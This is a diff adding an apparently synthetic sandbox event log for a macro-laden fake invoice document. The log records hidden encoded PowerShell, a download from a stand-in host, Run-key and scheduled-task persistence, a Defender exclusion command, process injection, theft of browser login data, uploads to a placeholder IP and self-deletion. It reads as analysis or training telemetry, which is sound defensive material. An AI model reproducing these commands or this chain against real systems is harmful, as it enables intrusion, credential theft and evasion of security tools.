@@ -1,0 +1,239 @@
+{
+  "sample": {
+    "name": "Invoice_2025-10.docm",
+    "sha256": "2ff95d39ccb5653f0a920649c46bb2c28e0cb67d3b1fb9b9989a5bd430891483",
+    "md5": "a2bbbcda67afc8a0c579a2747ad6fdc7",
+    "sha1": "1766dfcb4b5c89e6401b72c15bed6f5d37fb887f",
+    "size": 48213,
+    "file_type": "Word document with macros (SYNTHETIC training sample)"
+  },
+  "environment": {
+    "sandbox": "isolated VM + Sysmon (synthetic)",
+    "os": "Windows 10 22H2 x64",
+    "duration_s": 180,
+    "network": "simulated internet (INetSim-style), no real egress"
+  },
+  "events": [
+    {
+      "t": 0.0,
+      "type": "process_create",
+      "pid": 4120,
+      "ppid": 3012,
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "cmdline": "\"WINWORD.EXE\" \"C:\\Users\\analyst\\Desktop\\Invoice_2025-10.docm\"",
+      "parent_image": "C:\\Windows\\explorer.exe"
+    },
+    {
+      "t": 2.1,
+      "type": "dns_query",
+      "pid": 1088,
+      "name": "settings-win.data.microsoft.com",
+      "answers": [
+        "198.51.100.200"
+      ],
+      "image": "C:\\Windows\\System32\\svchost.exe"
+    },
+    {
+      "t": 8.4,
+      "type": "process_create",
+      "pid": 5208,
+      "ppid": 4120,
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "cmd.exe /c powershell -nop -w hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAcwB5AG4AdABoAGUAdABpAGMAIABzAGEAbQBwAGwAZQAgAC0AIABpAG4AZQByAHQAJwA=",
+      "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    },
+    {
+      "t": 8.9,
+      "type": "process_create",
+      "pid": 5320,
+      "ppid": 5208,
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell -nop -w hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAcwB5AG4AdABoAGUAdABpAGMAIABzAGEAbQBwAGwAZQAgAC0AIABpAG4AZQByAHQAJwA=",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+      "t": 10.2,
+      "type": "dns_query",
+      "pid": 5320,
+      "name": "update-cdn-7x2k9qv4mz.example",
+      "answers": [
+        "203.0.113.45"
+      ],
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+    {
+      "t": 10.5,
+      "type": "http_request",
+      "pid": 5320,
+      "method": "GET",
+      "url": "http://update-cdn-7x2k9qv4mz.example/stage2.bin",
+      "host": "update-cdn-7x2k9qv4mz.example"
+    },
+    {
+      "t": 11.0,
+      "type": "file_write",
+      "pid": 5320,
+      "path": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe",
+      "sha256": "9a496227eda43e61e28c028ac3db3b66322fcb051282861b2e5dd3c109a6a560"
+    },
+    {
+      "t": 11.4,
+      "type": "mutex_create",
+      "pid": 5600,
+      "name": "Global\\SynthMutex-7Q2K"
+    },
+    {
+      "t": 12.0,
+      "type": "process_create",
+      "pid": 5600,
+      "ppid": 5320,
+      "image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe",
+      "cmdline": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe",
+      "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "sha256": "9a496227eda43e61e28c028ac3db3b66322fcb051282861b2e5dd3c109a6a560"
+    },
+    {
+      "t": 12.6,
+      "type": "registry_set",
+      "pid": 5600,
+      "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "WindowsUpdateHelper",
+      "data": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 13.0,
+      "type": "process_create",
+      "pid": 5730,
+      "ppid": 5600,
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\analyst\\AppData\\Roaming",
+      "parent_image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 13.4,
+      "type": "process_inject",
+      "pid": 5600,
+      "target_pid": 3012,
+      "target_image": "C:\\Windows\\explorer.exe"
+    },
+    {
+      "t": 13.8,
+      "type": "process_create",
+      "pid": 5710,
+      "ppid": 5600,
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "cmdline": "schtasks /create /tn \"WinUpdHelper\" /tr \"C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe\" /sc onlogon",
+      "parent_image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 14.2,
+      "type": "process_create",
+      "pid": 5741,
+      "ppid": 5600,
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "cmdline": "whoami /all",
+      "parent_image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 14.4,
+      "type": "process_create",
+      "pid": 5742,
+      "ppid": 5600,
+      "image": "C:\\Windows\\System32\\systeminfo.exe",
+      "cmdline": "systeminfo",
+      "parent_image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 14.7,
+      "type": "process_create",
+      "pid": 5743,
+      "ppid": 5600,
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "cmdline": "ipconfig /all",
+      "parent_image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 15.3,
+      "type": "file_read",
+      "pid": 5600,
+      "path": "C:\\Users\\analyst\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+    },
+    {
+      "t": 20.0,
+      "type": "net_connect",
+      "pid": 5600,
+      "dst_ip": "203.0.113.45",
+      "dst_port": 8443,
+      "proto": "tcp"
+    },
+    {
+      "t": 30.2,
+      "type": "http_request",
+      "pid": 5600,
+      "method": "POST",
+      "url": "http://203.0.113.45:8443/gate",
+      "host": "203.0.113.45",
+      "bytes_out": 412
+    },
+    {
+      "t": 60.1,
+      "type": "http_request",
+      "pid": 5600,
+      "method": "POST",
+      "url": "http://203.0.113.45:8443/gate",
+      "host": "203.0.113.45",
+      "bytes_out": 413
+    },
+    {
+      "t": 90.4,
+      "type": "http_request",
+      "pid": 5600,
+      "method": "POST",
+      "url": "http://203.0.113.45:8443/gate",
+      "host": "203.0.113.45",
+      "bytes_out": 414
+    },
+    {
+      "t": 120.2,
+      "type": "http_request",
+      "pid": 5600,
+      "method": "POST",
+      "url": "http://203.0.113.45:8443/gate",
+      "host": "203.0.113.45",
+      "bytes_out": 415
+    },
+    {
+      "t": 150.3,
+      "type": "http_request",
+      "pid": 5600,
+      "method": "POST",
+      "url": "http://203.0.113.45:8443/gate",
+      "host": "203.0.113.45",
+      "bytes_out": 416
+    },
+    {
+      "t": 165.0,
+      "type": "http_request",
+      "pid": 5600,
+      "method": "POST",
+      "url": "http://203.0.113.45:8443/upload",
+      "host": "203.0.113.45",
+      "bytes_out": 524288
+    },
+    {
+      "t": 170.0,
+      "type": "process_create",
+      "pid": 5800,
+      "ppid": 5600,
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "cmd.exe /c ping -n 30 127.0.0.1 > nul & del \"C:\\Users\\analyst\\Desktop\\Invoice_2025-10.docm\"",
+      "parent_image": "C:\\Users\\analyst\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe"
+    },
+    {
+      "t": 172.0,
+      "type": "file_delete",
+      "pid": 5800,
+      "path": "C:\\Users\\analyst\\Desktop\\Invoice_2025-10.docm"
+    }
+  ]
+}
